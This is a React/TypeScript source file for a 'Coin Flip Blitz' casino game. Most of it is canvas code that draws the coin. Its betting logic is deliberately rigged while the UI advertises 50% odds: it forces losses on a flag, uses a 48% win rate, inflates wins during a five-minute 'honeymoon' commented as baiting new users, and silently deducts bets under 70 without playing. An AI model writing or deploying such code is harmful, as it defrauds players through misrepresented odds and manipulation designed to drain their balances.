import React, { useRef, useEffect, useState } from 'react';
import { synth } from '../../utils/audioSynth';
import { Sparkles, X, Play, ShieldAlert, Award } from 'lucide-react';
import { evaluateBet, logWin, logLoss } from '../../utils/casinoRigging';

interface GameProps {
  pokiBalance: number;
  onAwardBalance: (amount: number) => void;
  onDeductBalance: (amount: number, setBet?: (val: number) => void) => boolean;
  syncCasinoData: (gameName: string, netProfitLoss: number, finalCoins: number) => Promise<void>;
  onClose: () => void;
}

export default function CoinFlipBlitz({
  pokiBalance,
  onAwardBalance,
  onDeductBalance,
  syncCasinoData,
  onClose
}: GameProps) {
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const animRef = useRef<number | null>(null);

  const [gameState, setGameState] = useState<'idle' | 'flipping' | 'settled'>('idle');
  const [betAmount, setBetAmount] = useState<number>(70);
  const [userChoice, setUserChoice] = useState<'heads' | 'tails'>('heads');

  // Outcome
  const [flipResult, setFlipResult] = useState<'heads' | 'tails' | null>(null);
  const [winStatus, setWinStatus] = useState<boolean>(false);
  const [payoutAmt, setPayoutAmt] = useState<number>(0);

  // 3D Coin properties
  const coinAngle = useRef<number>(0);

  const drawCoin = (scaleY: number, currentFace: 'heads' | 'tails') => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    const w = canvas.width;
    const h = canvas.height;
    const cx = w / 2;
    const cy = h / 2;
    // Increased size for premium high-fidelity presence
    const radius = 86;

    ctx.clearRect(0, 0, w, h);

    // Apply simulated 3D vertical perspective scale
    ctx.save();
    ctx.translate(cx, cy);
    ctx.scale(1.0, Math.max(0.01, Math.sin(scaleY)));

    // 1. REALISTIC CAST SHADOW (3D DEPTH)
    ctx.shadowColor = 'rgba(0, 0, 0, 0.65)';
    ctx.shadowBlur = 15;
    ctx.shadowOffsetY = 8;
    ctx.beginPath();
    ctx.arc(0, 0, radius, 0, Math.PI * 2);
    ctx.fill();
    ctx.shadowBlur = 0; // Reset shadow immediately so it doesn't bleed into inner drawings
    ctx.shadowOffsetY = 0;

    // 2. PREMIUM MULTI-LAYERED OUTER BEVEL & RIM
    const rimGrad = ctx.createLinearGradient(-radius, -radius, radius, radius);
    if (currentFace === 'heads') {
      // Golden specularity
      rimGrad.addColorStop(0, '#9a7116');
      rimGrad.addColorStop(0.25, '#ffe596');
      rimGrad.addColorStop(0.5, '#ffd254');
      rimGrad.addColorStop(0.75, '#5d4107');
      rimGrad.addColorStop(1, '#ffebad');
    } else {
      // Slate/Silver chrome specularity
      rimGrad.addColorStop(0, '#1e293b');
      rimGrad.addColorStop(0.25, '#f1f5f9');
      rimGrad.addColorStop(0.5, '#64748b');
      rimGrad.addColorStop(0.75, '#0f172a');
      rimGrad.addColorStop(1, '#cbd5e1');
    }
    ctx.fillStyle = rimGrad;
    ctx.beginPath();
    ctx.arc(0, 0, radius, 0, Math.PI * 2);
    ctx.fill();

    // 3. MINTED COIN RIDGES (Radial tick marks around the border)
    ctx.strokeStyle = currentFace === 'heads' ? 'rgba(0, 0, 0, 0.45)' : 'rgba(0, 0, 0, 0.35)';
    ctx.lineWidth = 2.5;
    ctx.beginPath();
    for (let angle = 0; angle < Math.PI * 2; angle += Math.PI / 32) {
      const cos = Math.cos(angle);
      const sin = Math.sin(angle);
      ctx.moveTo(cos * (radius - 5), sin * (radius - 5));
      ctx.lineTo(cos * radius, sin * radius);
    }
    ctx.stroke();

    // 4. INNER BEVEL LIP
    const innerRimGrad = ctx.createRadialGradient(0, 0, radius * 0.82, 0, 0, radius * 0.94);
    if (currentFace === 'heads') {
      innerRimGrad.addColorStop(0, '#ffd254');
      innerRimGrad.addColorStop(0.5, '#f3b31c');
      innerRimGrad.addColorStop(1, '#87600c');
    } else {
      innerRimGrad.addColorStop(0, '#94a3b8');
      innerRimGrad.addColorStop(0.5, '#475569');
      innerRimGrad.addColorStop(1, '#1e293b');
    }
    ctx.fillStyle = innerRimGrad;
    ctx.beginPath();
    ctx.arc(0, 0, radius * 0.92, 0, Math.PI * 2);
    ctx.fill();

    // 5. INNER DARK METALLIC PLATE
    const plateGrad = ctx.createRadialGradient(0, 0, 0, 0, 0, radius * 0.82);
    if (currentFace === 'heads') {
      plateGrad.addColorStop(0, '#2d1e00'); // deep royal brass gold core
      plateGrad.addColorStop(0.7, '#150f00');
      plateGrad.addColorStop(1, '#3b2a04');
    } else {
      plateGrad.addColorStop(0, '#0f172a'); // deep obsidian steel core
      plateGrad.addColorStop(0.7, '#020617');
      plateGrad.addColorStop(1, '#1e293b');
    }
    ctx.fillStyle = plateGrad;
    ctx.beginPath();
    ctx.arc(0, 0, radius * 0.82, 0, Math.PI * 2);
    ctx.fill();

    // 6. FINE RINGS (Concentric design aesthetics)
    ctx.strokeStyle = currentFace === 'heads' ? 'rgba(255, 210, 84, 0.3)' : 'rgba(148, 163, 184, 0.3)';
    ctx.lineWidth = 1;
    ctx.beginPath();
    ctx.arc(0, 0, radius * 0.76, 0, Math.PI * 2);
    ctx.stroke();
    ctx.beginPath();
    ctx.arc(0, 0, radius * 0.68, 0, Math.PI * 2);
    ctx.stroke();

    // 7. HIGH-FIDELITY CENTERPIECE GRAPHIC
    if (currentFace === 'heads') {
      // HEADS: Majestic Laurel Leaves encircling a glowing Golden Crown
      ctx.save();
      
      // Laurel Leaves
      ctx.strokeStyle = '#f3b31c';
      ctx.lineWidth = 1.5;
      ctx.beginPath();
      // Left branch
      ctx.arc(-radius * 0.28, 0, radius * 0.45, Math.PI * 0.6, Math.PI * 1.4);
      // Right branch
      ctx.arc(radius * 0.28, 0, radius * 0.45, Math.PI * 0.4, -Math.PI * 0.4, true);
      ctx.stroke();

      // Laurel leaf petals
      ctx.fillStyle = '#ffe596';
      for (let i = -4; i <= 4; i++) {
        if (i === 0) continue;
        const leafY = i * radius * 0.12;
        const leafX = radius * 0.38 - Math.abs(i) * 3;
        // Draw left leaf
        ctx.beginPath();
        ctx.ellipse(-leafX, leafY, 5, 2.5, Math.PI / 4, 0, Math.PI * 2);
        ctx.fill();
        // Draw right leaf
        ctx.beginPath();
        ctx.ellipse(leafX, leafY, 5, 2.5, -Math.PI / 4, 0, Math.PI * 2);
        ctx.fill();
      }

      // Draw Crown in the center
      const cyOffset = -radius * 0.05;
      ctx.fillStyle = '#ffe596';
      ctx.beginPath();
      ctx.moveTo(-20, cyOffset + 12);
      ctx.lineTo(-20, cyOffset - 4);
      ctx.lineTo(-11, cyOffset + 4);
      ctx.lineTo(0, cyOffset - 12); // Center crown tip
      ctx.lineTo(11, cyOffset + 4);
      ctx.lineTo(20, cyOffset - 4);
      ctx.lineTo(20, cyOffset + 12);
      ctx.closePath();
      ctx.fill();

      // Crown jewels / details
      ctx.fillStyle = '#2d1e00';
      ctx.beginPath();
      ctx.rect(-15, cyOffset + 7, 30, 2.5);
      ctx.fill();
      
      // Crown tips glowing circles
      ctx.fillStyle = '#ffffff';
      ctx.beginPath();
      ctx.arc(-20, cyOffset - 4, 2, 0, Math.PI * 2);
      ctx.arc(0, cyOffset - 12, 2.5, 0, Math.PI * 2);
      ctx.arc(20, cyOffset - 4, 2, 0, Math.PI * 2);
      ctx.fill();

      // Premium text label "POKI"
      ctx.fillStyle = '#ffd254';
      ctx.font = 'black 12px "Inter", sans-serif';
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      ctx.fillText('POKI', 0, radius * 0.32);

      ctx.restore();
    } else {
      // TAILS: Detailed Cyber-Circuit Blockchain Medallion with Node connections
      ctx.save();

      // Draw outer geometric octagon
      ctx.strokeStyle = '#38bdf8';
      ctx.lineWidth = 1.2;
      ctx.beginPath();
      for (let i = 0; i < 8; i++) {
        const angle = (i * Math.PI) / 4;
        ctx.lineTo(Math.cos(angle) * radius * 0.52, Math.sin(angle) * radius * 0.52);
      }
      ctx.closePath();
      ctx.stroke();

      // Circuit lines emanating from center
      ctx.strokeStyle = 'rgba(56, 189, 248, 0.4)';
      ctx.lineWidth = 1;
      for (let i = 0; i < 4; i++) {
        const angle = (i * Math.PI) / 2 + Math.PI / 4;
        ctx.beginPath();
        ctx.moveTo(0, 0);
        ctx.lineTo(Math.cos(angle) * radius * 0.52, Math.sin(angle) * radius * 0.52);
        ctx.stroke();
      }

      // Cyber Shield / Core
      ctx.fillStyle = '#0284c7';
      ctx.beginPath();
      ctx.arc(0, 0, radius * 0.28, 0, Math.PI * 2);
      ctx.fill();

      // Circuit node circles
      ctx.fillStyle = '#38bdf8';
      ctx.beginPath();
      ctx.arc(0, 0, 5, 0, Math.PI * 2);
      for (let i = 0; i < 8; i++) {
        const angle = (i * Math.PI) / 4;
        ctx.arc(Math.cos(angle) * radius * 0.52, Math.sin(angle) * radius * 0.52, 3, 0, Math.PI * 2);
      }
      ctx.fill();

      // Digital 'T' monogram in the center of tails core
      ctx.fillStyle = '#0f172a';
      ctx.font = 'bold 12px "JetBrains Mono", monospace';
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      ctx.fillText('T', 0, 0);

      // Premium text label "TAILS"
      ctx.fillStyle = '#cbd5e1';
      ctx.font = 'bold 11px "Inter", sans-serif';
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      ctx.fillText('TAILS', 0, radius * 0.32);

      ctx.restore();
    }

    // 8. RICH SPECTRAL LENS REFLECTION (DYNAMIC GLARE)
    const shineOffset = (scaleY * 30) % (radius * 4) - radius * 2;
    const shineGrad = ctx.createLinearGradient(shineOffset - 25, shineOffset - 25, shineOffset + 25, shineOffset + 25);
    shineGrad.addColorStop(0, 'rgba(255, 255, 255, 0)');
    shineGrad.addColorStop(0.35, 'rgba(255, 255, 255, 0.05)');
    shineGrad.addColorStop(0.5, 'rgba(255, 255, 255, 0.38)');
    shineGrad.addColorStop(0.65, 'rgba(255, 255, 255, 0.05)');
    shineGrad.addColorStop(1, 'rgba(255, 255, 255, 0)');
    
    ctx.fillStyle = shineGrad;
    ctx.beginPath();
    ctx.arc(0, 0, radius * 0.92, 0, Math.PI * 2);
    ctx.fill();

    ctx.restore();
  };

  const flipCoin = () => {
    if (gameState === 'flipping') return;

    const parsedBet = parseFloat(betAmount.toFixed(4));
    if (isNaN(parsedBet) || parsedBet <= 0) {
      alert('Specify a valid bet greater than 0.');
      return;
    }

    const uId = window.currentUserId || 'anonymous';
    const evaluation = evaluateBet(uId, parsedBet, pokiBalance);
    if (!evaluation.allowed) {
      alert(evaluation.reason || 'Bet blocked by security parameters.');
      return;
    }

    if (parsedBet < 70) {
      onDeductBalance(parsedBet, setBetAmount);
      return;
    }

    if (!onDeductBalance(parsedBet, setBetAmount)) {
      alert('Insufficient Pokicoin balance.');
      return;
    }

    setGameState('flipping');
    synth.playCoin();

    // Rigged Outcome generator
    let targetSide: 'heads' | 'tails' = 'heads';
    const coinFlipRandom = Math.random();

    if (evaluation.shouldForceLoss) {
      // Force a loss
      targetSide = userChoice === 'heads' ? 'tails' : 'heads';
    } else {
      // Check for Honeymoon Phase (within first 5 minutes of playing)
      const stats = JSON.parse(localStorage.getItem(`casino_rigging_${uId}`) || '{}');
      const isHoneymoon = stats.firstPlayTime && (Date.now() - stats.firstPlayTime < 5 * 60 * 1000);
      
      let winChance = 0.48; // Standard 48% slightly under fair (house edge)
      
      if (isHoneymoon && parsedBet < 150) {
        winChance = 0.65; // Boosted win rate to bait the new user
      } else if (evaluation.applyBrakeMode && parsedBet < 100) {
        winChance = 0.58; // Slower drain rate in Brake Mode for small bets
      }

      const playerWins = coinFlipRandom < winChance;
      if (playerWins) {
        targetSide = userChoice;
      } else {
        targetSide = userChoice === 'heads' ? 'tails' : 'heads';
      }
    }

    const flipDur = 2000; // 2 seconds
    const startFlip = Date.now();

    const doFlipSequence = () => {
      const elapsed = Date.now() - startFlip;
      const progress = Math.min(1.0, elapsed / flipDur);

      // Fast deceleration
      const ease = 1 - Math.pow(1 - progress, 3);
      // high angular accumulation for rapid rotations
      const currentRot = ease * Math.PI * 18;
      coinAngle.current = currentRot;

      // Draw alternating faces during rapidly vertical scaling rotations
      let virtualFace: 'heads' | 'tails' = 'heads';
      const division = Math.floor(currentRot / Math.PI) % 2;
      
      if (progress < 1.0) {
        virtualFace = division === 0 ? 'heads' : 'tails';
        drawCoin(currentRot, virtualFace);
        synth.playJump(); // subtle air slice sound
        animRef.current = requestAnimationFrame(doFlipSequence);
      } else {
        // SETTLE ON TARGET OUTCOME
        drawCoin(Math.PI, targetSide);
        setFlipResult(targetSide);

        const isWin = targetSide === userChoice;
        const payoutVal = isWin ? parseFloat((parsedBet * 2.0).toFixed(8)) : 0;
        const netProfit = isWin ? parseFloat((payoutVal - parsedBet).toFixed(8)) : -parsedBet;

        setWinStatus(isWin);
        setPayoutAmt(payoutVal);
        setGameState('settled');

        if (isWin) {
          synth.playLevelUp();
          onAwardBalance(payoutVal);
          logWin(uId, parsedBet, payoutVal, 'Coin Flip Blitz', pokiBalance);
          syncCasinoData('Coin Flip Blitz', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
        } else {
          synth.playCrash();
          logLoss(uId, parsedBet, 'Coin Flip Blitz', pokiBalance);
          syncCasinoData('Coin Flip Blitz', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
        }
      }
    };

    animRef.current = requestAnimationFrame(doFlipSequence);
  };

  useEffect(() => {
    drawCoin(Math.PI, 'heads');
    return () => {
      if (animRef.current) cancelAnimationFrame(animRef.current);
    };
  }, []);

  return (
    <div className="w-full bg-[#171a21] border border-[#2a2f3b] rounded-xl p-5 text-left md:p-6 overflow-hidden relative" id="game-17-coinflip">
      {/* Header */}
      <div className="flex items-center justify-between border-b border-[#2a2f3b] pb-3 mb-4">
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 rounded-full bg-[#ffb703]/10 border border-[#ffb703]/20 flex items-center justify-center text-[#ffb703]">
            <Sparkles className="w-4 h-4" />
          </div>
          <div>
            <h4 className="text-white font-sans font-bold text-sm tracking-wider uppercase">COIN FLIP BLITZ</h4>
            <span className="text-[9px] font-mono tracking-widest text-amber-500 uppercase">DOUBLE OR NOTHING 50% ODDS</span>
          </div>
        </div>
        <button onClick={onClose} className="text-gray-500 hover:text-white transition cursor-pointer">
          <X className="w-4 h-4" />
        </button>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-center">
        {/* Left canvas flipping container */}
        <div className="relative bg-[#0b0c10] border border-[#2a2f3b] rounded-lg p-6 aspect-square flex items-center justify-center w-full max-w-[280px] mx-auto md:max-w-none">
          <canvas
            ref={canvasRef}
            width={280}
            height={280}
            className="w-full h-full max-w-[240px] max-h-[240px]"
          />

          {/* Results display Modal container overlay inside border */}
          {gameState === 'settled' && flipResult && (
            <div className="absolute inset-0 bg-black/85 flex flex-col items-center justify-center z-10 p-4 text-center animate-fade-in rounded-lg">
              {winStatus ? (
                <Award className="w-12 h-12 text-emerald-400 mb-1.5 animate-pulse" />
              ) : (
                <ShieldAlert className="w-12 h-12 text-red-500 mb-1.5 animate-bounce" />
              )}
              <h2 className="text-white font-sans font-extrabold text-xl capitalize mb-1">
                COIN LANDED: {flipResult}
              </h2>
              <span className={`text-[9.5px] font-mono tracking-widest uppercase border rounded px-2.5 py-0.5 ${
                flipResult === 'heads' ? 'bg-[#ffb703]/10 border-[#ffb703]/20 text-[#ffb703]' : 'bg-gray-400/10 border-gray-400/20 text-gray-300'
              }`}>
                {flipResult === 'heads' ? 'Heads POKI Side' : 'Tails Matrix Side'}
              </span>

              <div className="mt-4 font-mono text-sm">
                {winStatus ? (
                  <p className="text-emerald-400 font-bold">DOUBLE WIN! Payout: +{payoutAmt.toFixed(4)} POKI</p>
                ) : (
                  <p className="text-red-500 font-bold">LOST: -{betAmount} POKI</p>
                )}
              </div>

              <button
                onClick={() => setGameState('idle')}
                className="mt-5 px-5 py-2 bg-[#ffb703] text-black font-mono font-bold text-xs uppercase rounded cursor-pointer active:scale-95 transition"
              >
                FLIP AGAIN
              </button>
            </div>
          )}
        </div>

        {/* Right side interactive betting parameters */}
        <div className="flex flex-col justify-between">
          <div className="space-y-4">
            {/* Selection Heads/Tails */}
            <div>
              <span className="block text-[10px] font-mono font-bold text-gray-400 tracking-wider uppercase mb-1.5">
                CHOOSE COIN SIDE
              </span>
              <div className="grid grid-cols-2 gap-2.5">
                <button
                  type="button"
                  disabled={gameState === 'flipping'}
                  onClick={() => { synth.playCoin(); setUserChoice('heads'); }}
                  className={`py-3 rounded text-xs font-mono font-bold transition flex flex-col items-center justify-center border cursor-pointer ${
                    userChoice === 'heads'
                      ? 'bg-[#ffb703] text-black border-[#ffb703]'
                      : 'bg-[#0b0c10] text-[#ffb703] border-[#2a2f3b] hover:border-[#ffb703]/50'
                  }`}
                >
                  <span className="text-sm font-extrabold">HEADS</span>
                  <span className="text-[8px] tracking-wider opacity-85">(P - Gold Coin)</span>
                </button>

                <button
                  type="button"
                  disabled={gameState === 'flipping'}
                  onClick={() => { synth.playCoin(); setUserChoice('tails'); }}
                  className={`py-3 rounded text-xs font-mono font-bold transition flex flex-col items-center justify-center border cursor-pointer ${
                    userChoice === 'tails'
                      ? 'bg-white text-black border-white'
                      : 'bg-[#0b0c10] text-gray-400 border-[#2a2f3b] hover:border-white/50'
                  }`}
                >
                  <span className="text-sm font-extrabold">TAILS</span>
                  <span className="text-[8px] tracking-wider opacity-85">(T - Slate Coin)</span>
                </button>
              </div>
            </div>

            {/* Stake Input */}
            <div>
              <div className="flex items-center justify-between font-mono text-[10px] mb-1.5">
                <span className="text-gray-400 font-bold uppercase">Bet Stake (POKI)</span>
                <span className="text-gray-500">Node coins: {pokiBalance.toFixed(4)}</span>
              </div>
              <input
                type="number"
                disabled={gameState === 'flipping'}
                value={betAmount === 0 ? '' : betAmount}
                onChange={(e) => setBetAmount(Math.max(0.0001, parseFloat(e.target.value) || 0))}
                className="bg-[#0b0c10] border border-[#2a2f3b] text-white rounded px-3 py-2 text-sm font-mono w-full focus:outline-none focus:border-[#ffb703]/50"
              />
            </div>
          </div>

          <button
            onClick={flipCoin}
            disabled={gameState === 'flipping'}
            className="w-full py-3.5 mt-6 bg-gradient-to-r from-amber-500 to-yellow-500 text-black font-sans font-black text-sm uppercase rounded tracking-widest shadow-lg shadow-amber-500/10 cursor-pointer active:scale-95 transition disabled:opacity-50"
          >
            {gameState === 'flipping' ? 'COIN SPINNING...' : 'ACTIVATE COIN FLIP'}
          </button>
        </div>
      </div>
    </div>
  );
}
